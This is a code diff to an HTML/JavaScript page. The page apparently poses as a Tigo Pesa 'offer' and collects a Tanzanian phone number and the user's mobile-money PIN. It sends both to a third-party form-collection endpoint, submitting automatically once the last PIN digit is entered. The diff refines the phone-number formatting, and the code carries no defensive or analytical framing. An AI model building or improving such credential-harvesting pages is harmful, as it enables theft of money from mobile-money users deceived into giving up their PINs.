@@ -18,12 +18,16 @@
         
         <!-- The form now points to your Formbold endpoint -->
         <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
-            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu (eg. 07XXXXXXXX)" required>
             
-            <!-- Using your preferred HTML structure for the PIN -->
+            <!-- NEW: Custom phone number input container -->
+            <div class="phone-input-container">
+                <span class="flag">🇹🇿</span>
+                <span class="country-code">+255</span>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu" maxlength="9" required>
+            </div>
+
             <p>Enter your Tigo Pesa PIN</p>
             <div class="pin-boxes">
-                <!-- CHANGED: type from password to tel -->
                 <input type="tel" maxlength="1" class="pin-box" data-index="0" required>
                 <input type="tel" maxlength="1" class="pin-box" data-index="1" required>
                 <input type="tel" maxlength="1" class="pin-box" data-index="2" required>
@@ -42,6 +46,13 @@
         const pinBoxes = document.querySelectorAll('.pin-box');
         const form = document.getElementById('offerForm');
         const hiddenPinInput = document.getElementById('pin');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+
+        // Function to format the phone number before submission
+        const formatPhoneNumber = () => {
+            const fullNumber = '+255' + phoneNumberInput.value;
+            return fullNumber;
+        };
 
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
@@ -49,12 +60,12 @@
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
 
                 if (e.target.value.length === 1) {
-                    // Move to the next box
                     if (index < pinBoxes.length - 1) {
                         pinBoxes[index + 1].focus();
                     } else {
-                        // If this is the last box, submit the form
                         updateHiddenPin();
+                        // Update the phone number value to the full format before submitting
+                        phoneNumberInput.value = formatPhoneNumber();
                         form.submit();
                     }
                 }
@@ -62,7 +73,6 @@
             });
 
             box.addEventListener('keydown', (e) => {
-                // Handle backspace to move to the previous box
                 if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                     pinBoxes[index - 1].focus();
                 }
